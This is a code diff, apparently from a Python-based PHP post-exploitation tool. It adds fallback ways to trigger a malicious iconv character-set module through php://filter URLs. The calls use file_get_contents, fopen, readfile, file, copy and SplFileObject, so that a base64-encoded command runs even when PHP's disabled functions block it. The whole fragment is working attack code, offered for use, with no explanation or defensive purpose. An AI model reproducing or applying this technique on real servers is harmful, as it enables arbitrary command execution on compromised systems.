@@ -1945,6 +1945,18 @@ if(function_exists('iconv')){
     iconv("payload", "UTF-8", "whatever");
 } else if(function_exists('iconv_strlen')) {
     iconv_strlen("1","payload");
+} else if(function_exists('file_get_contents')){
+  @file_get_contents("php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==");
+}else if (function_exists('fopen')){
+  @fopen('php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==','r');
+} else if (function_exists('readfile')){
+  @readfile('php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==');
+} else if (function_exists('file')) {
+  @file('php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==');
+} else if (function_exists('copy')) {
+  @copy('php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==',"/dev/null");
+} else if (class_exists('SplFileObject')) {
+  new SplFileObject('php://filter/convert.iconv.payload.UTF-8/resource=data://text/plain;base64,MQ==');
 }
 """ % (p, base64_encode(command))
         send(pre_phpcode, quiet=True)
